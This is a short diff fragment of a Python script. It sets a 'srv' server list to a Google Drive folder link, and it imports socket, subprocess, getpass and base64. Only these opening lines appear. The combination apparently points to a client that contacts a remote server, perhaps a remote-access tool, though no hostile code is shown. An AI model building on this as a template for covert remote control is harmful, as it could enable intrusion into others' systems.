@@ -1,4 +1,4 @@
-srv=['']
+srv=['https://drive.google.com/drive/folders/15y_8lv4wDCzZmN0KL9CAwX9n-qkLtG89?usp=drive_link']
 import sys,time,base64,socket,random,getpass,subprocess
 if sys.version_info.major==2:
  import urllib as parse
